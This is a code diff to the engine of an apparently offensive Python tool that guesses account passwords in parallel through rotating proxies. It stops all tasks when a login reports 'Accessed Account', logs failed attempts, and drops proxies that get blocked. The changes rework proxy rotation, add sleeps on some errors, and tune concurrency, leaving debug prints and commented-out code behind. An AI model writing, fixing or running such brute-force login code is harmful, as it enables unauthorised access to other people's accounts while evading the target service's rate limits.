@@ -6,6 +6,7 @@ import logging.config
 import asyncio
 import concurrent.futures
 import queue
+import time
 
 from app import settings
 
@@ -41,8 +42,17 @@ class Engine(object):
         self.log = logging.getLogger(self.__loggers__['__base__'])
 
     def _handle_login_api_error(self, e, log, proxy):
-        if isinstance(e, exceptions.ApiBadProxyException):
-            log.warn(f'Found Bad Proxy {proxy.ip}')
+        # HERE we need a way to distinguish between a bad proxy error that should
+        # result in the proxy being updated or an error that requires just
+        # sleeping and maintaining the same proxy, since if results is None,
+        # the method will just update the proxy.
+
+        print("CHECK HERE")
+        if e.__sleep__:
+            log.warn(f'{e.__class__.__name__}... Sleeping {proxy.ip}')
+            time.sleep(0.5)
+        elif isinstance(e, exceptions.ApiBadProxyException):
+            log.warn(f'{e.__class__.__name__} Bad Proxy {proxy.ip}')
         elif isinstance(e, exceptions.ApiClientException):
             if e.error_type == settings.GENERIC_REQUEST_ERROR:
                 log.warn(f'Found Bad Proxy w Generic Request Error {proxy.ip}')
@@ -69,7 +79,7 @@ class Engine(object):
             self._handle_login_api_error(e, log, proxy)
             return None
         else:
-            self.queues.put('proxy', proxy)
+            # self.queues.put('proxy', proxy)
             log.info(f"Got Results for {password}: {results}")
             return results
 
@@ -152,7 +162,8 @@ class EngineAsync(Engine):
         tasks = []
         while not self.queues.passwords.empty() and not stop_event.is_set():
             password = self.queues.passwords.get_nowait()
-            task = loop.run_in_executor(executor, self._login, password, token, stop_event)
+            task = loop.run_in_executor(executor, self._login, password, token,
+                self.queues.proxy_list, stop_event)
             tasks.append(task)
         return tasks
 
@@ -185,7 +196,7 @@ class EngineAsync(Engine):
         loop = asyncio.get_event_loop()
         stop_event = asyncio.Event()
 
-        executor = concurrent.futures.ThreadPoolExecutor(max_workers=20)
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
         tasks = self._create_login_tasks(executor, loop, stop_event, token)
 
         await asyncio.gather(*tasks)
@@ -220,34 +231,42 @@ class EngineAsync(Engine):
     #     log.info("Storing Attempting Password")
     #     self.user.add_password_attempt(password)
 
-    def _login(self, password, token, stop_event):
+    def _login(self, password, token, proxy_list, stop_event):
+        index = 0
         while not stop_event.is_set():
-            try:
-                proxy = self.queues.proxies.get_nowait()
-            except asyncio.QueueEmpty:
-                continue
+            # try:
+            #     proxy = self.queues.proxies.get_nowait()
+            # except IndexError:
+            #     continue
+            # else:
+            # if stop_event.is_set():
+            #     self.log.info("Aborting Task")
+            #     return
+            proxy = proxy_list[index]
+            results = self._login_with_proxy(password, token, proxy)
+            if results:
+                if results.accessed:
+                    self.log.success("Accessed Account... Setting Stop Event")
+                    stop_event.set()
+
+                    # Just doing this temporarily when dealing with a lot of
+                    # passwords so we don't lose the authenticated one.
+                    self.log.exit("Accessed Account... Setting Stop Event")
+                else:
+                    self.queues.put('attempt', password)
+
+                    # Doing this asynchronously keeps hitting an event loop
+                    # closed error, so for now we will just add like this.
+                    self.user.add_password_attempt(password)
+                    # loop = asyncio.get_running_loop()
+                    # loop.run_until_complete(self.store_attempted_password(password))
+                return results
             else:
-                if stop_event.is_set():
-                    self.log.info("Aborting Task")
-                    return
-                results = self._login_with_proxy(password, token, proxy)
-                if results:
-                    if results.accessed:
-                        self.log.success("Accessed Account... Setting Stop Event")
-                        stop_event.set()
-
-                        # Just doing this temporarily when dealing with a lot of
-                        # passwords so we don't lose the authenticated one.
-                        self.log.exit("Accessed Account... Setting Stop Event")
-                    else:
-                        self.queues.put('attempt', password)
-
-                        # Doing this asynchronously keeps hitting an event loop
-                        # closed error, so for now we will just add like this.
-                        self.user.add_password_attempt(password)
-                        # loop = asyncio.get_running_loop()
-                        # loop.run_until_complete(self.store_attempted_password(password))
-                    return results
+                # We should use a lock here to make sure that we do not have
+                # multiple resources trying to remove same proxy.
+                index += 1
+                if proxy in proxy_list:
+                    proxy_list.remove(proxy)
 
         self.log.info("Aborting Task")
 
